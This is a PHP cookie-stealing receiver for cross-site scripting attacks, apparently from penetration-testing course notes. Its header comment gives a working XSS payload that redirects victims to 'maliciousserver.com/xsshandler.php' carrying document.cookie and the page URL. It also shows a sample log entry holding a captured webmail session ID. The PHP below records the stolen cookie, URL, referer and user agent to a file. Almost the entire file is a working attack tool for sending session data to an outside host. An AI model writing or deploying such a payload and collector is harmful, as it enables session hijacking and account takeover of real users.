/*
  Handles XSS redirects formatted in the following way:
  <html><body onload='document.location.replace("http://maliciousserver.com/xsshandler.php?name=victim1&message=" + document.cookie + "&" + "url=" + document.location);'></body></html>

  Example output:
  
  root@ctpmnstr:~/ctp_notes/files# tail -f /var/www/output.txt
  
  [ 22:49:36 on 2015-07-28 ]
  
  UAS:            Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322)
  machine:        victim1
  cookie:         js_cipher=0;%20skinwidth1=278;%20IceWarpWebMailSessID=210c49c2aff67f65f872332bec42fd01
  url:            http://localhost:32000/mail/view.html?id=34aee53133a7d060ac9f2624e2b34bdd
  referer:        http://localhost:32000/mail/blankskin.html?id=34aee53133a7d060ac9f2624e2b34bdd

*/
   
<?php

	$timestamp = date("H:i:s \o\\n Y-m-d");
	$machine   = $_GET["name"];
	$msg  	   = $_GET["message"];
	$msg       = str_replace(" ", "%20", $msg);
	$loc       = $_GET["url"];
	$from      = $_SERVER["HTTP_REFERER"];
	$uas       = $_SERVER["HTTP_USER_AGENT"];

	echo error_get_last() . "<br>";

	try {

		file_put_contents('output.txt',  "\n\n[ " . $timestamp           .        " ]\n\n", FILE_APPEND);
		file_put_contents('output.txt',  str_pad("UAS:",     16, " ")    . $uas     . "\n", FILE_APPEND);
		file_put_contents('output.txt',  str_pad("machine:", 16, " ")    . $machine . "\n", FILE_APPEND);
		file_put_contents('output.txt',  str_pad("cookie:",  16, " ")    . $msg     . "\n", FILE_APPEND);
		file_put_contents('output.txt',  str_pad("url:",     16, " ")    . $loc     . "\n", FILE_APPEND);
		file_put_contents('output.txt',  str_pad("referer:", 16, " ")    . $from    . "\n", FILE_APPEND);

	} catch (Exception $e) {
		file_put_contents('output.txt', "\n\n[ " . $timestamp . " ]\n\n" . str_pad("ERROR!!!:", 16, " ") . error_get_last());
	}
	
?>
